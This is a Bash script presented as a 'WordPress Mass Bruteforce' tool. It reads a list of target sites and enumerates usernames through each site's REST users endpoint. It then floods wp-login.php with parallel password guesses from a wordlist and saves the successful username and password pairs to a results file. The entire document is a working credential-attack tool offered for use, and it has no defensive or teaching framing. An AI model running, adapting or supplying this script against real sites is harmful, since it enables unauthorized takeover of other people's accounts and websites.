#!/bin/bash
#Author : Alkautsar Putra 
#Indonesuan Error System

#----------- CONFIGURATION -----------
curl_timeout=20
multithread_limit=10
#--------- CONFIGURATION EOF ---------

if [[ -f wpusername.tmp ]]
then
	rm wpusername.tmp
fi
RED='\e[31m'
GRN='\e[32m'
YEL='\e[33m'
CLR='\e[0m'

function _GetUserWPJSON() {
	Site="${1}";
	UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Site}/wp-json/wp/v2/users" | grep -Po '"name":"\K.*?(?=")');
	echo ""
	if [[ -z ${UsernameLists} ]];
	then
		echo -e "${YEL}INFO: Cannot detect Username!${CLR}"
	else
		echo -ne > wpusername.tmp
		for Username in ${UsernameLists};
		do
			echo "INFO: Found username \"${Username}\"..."
			echo "${Username}" >> wpusername.tmp
		done
	fi
}

function _TestLogin() {
	Target="${1}"
	Username="${2}"
	Password="${3}"
	LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
	if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
	then
		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
	elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
	then
		echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
		echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
	else
		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
	fi
}

echo -e  "${YEL}                     WordPress Mass Bruteforce"
echo -e "${CLR}                 https://github.com/JExCoders/MassWP${YEL}"

echo -ne "[?] Input website target : "
read Target

if [[ ! -f ${Target} ]]
then
	echo -e "${RED}ERROR: List site not found!${CLR}"
	exit
fi

echo -ne "[?] Input password lists in (file) : "
read PasswordLists

if [[ ! -f ${PasswordLists} ]]
then
	echo -e "${RED}ERROR: Wordlists not found!${CLR}"
	exit
fi

_GetUserWPJSON $(cat ${Target})

if [[ -f wpusername.tmp ]]
then
	for User in $(cat wpusername.tmp)
	do
	 (
	  for Site in $(cat ${Target})
	  do
		(
			for Pass in $(cat ${PasswordLists})
			do
				((cthread=cthread%multithread_limit)); ((cthread++==1)) && wait
				_TestLogin ${Site} ${User} ${Pass} &
			done
			wait
			)
			done
			wait
		)
	done
else
	echo -e "${YEL}INFO: Cannot find username${CLR}"
	echo -ne "[?] Input username manually : "
	read User

	if [[ -z ${PasswordLists} ]]
	then
		echo -e "${RED}ERROR: Username cannot be empty!${CLR}"
		exit
	fi
	(
	 for Site in $(cat ${Target})
	 do
		(
		for Pass in $(cat ${PasswordLists})
		do
			((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
			_TestLogin ${Site} ${User} ${Pass} &
		done
		wait
		)
		done
		wait
	)
  fi
echo "INFO: Found $(cat wpbf-results.txt | grep ${Site} | sort -nr | uniq | wc -l) username & password in wpbf-results.txt"